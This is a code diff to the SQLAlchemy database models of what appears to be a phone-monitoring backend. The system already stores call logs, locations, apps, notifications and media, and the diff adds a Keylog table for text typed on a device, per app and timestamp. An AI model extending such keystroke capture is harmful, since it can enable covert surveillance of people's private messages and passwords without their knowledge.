@@ -19,6 +19,7 @@ class User(Base):
     locations = relationship("Location", back_populates="owner")
     installed_apps = relationship("InstalledApp", back_populates="owner")
     notifications = relationship("Notification", back_populates="owner")
+    keylogs = relationship("Keylog", back_populates="owner")
 
 class Device(Base):
     __tablename__ = "devices"
@@ -40,6 +41,7 @@ class Device(Base):
     locations = relationship("Location", back_populates="device")
     installed_apps = relationship("InstalledApp", back_populates="device")
     notifications = relationship("Notification", back_populates="device")
+    keylogs = relationship("Keylog", back_populates="device")
 
 class CallLog(Base):
     __tablename__ = "call_logs"
@@ -155,4 +157,18 @@ class MediaFile(Base):
     created_at = Column(DateTime(timezone=True), default=func.now())
     device_id = Column(Integer, ForeignKey("devices.id"))
     owner_id = Column(Integer, ForeignKey("users.id"))
+
+class Keylog(Base):
+    __tablename__ = "keylogs"
+    id = Column(Integer, primary_key=True, index=True)
+    package_name = Column(String, index=True)
+    app_name = Column(String)
+    typed_text = Column(String)
+    timestamp = Column(BigInteger)
+    device_id = Column(Integer, ForeignKey("devices.id"))
+    owner_id = Column(Integer, ForeignKey("users.id"))
+
+    owner = relationship("User", back_populates="keylogs")
+    device = relationship("Device", back_populates="keylogs")
+
 
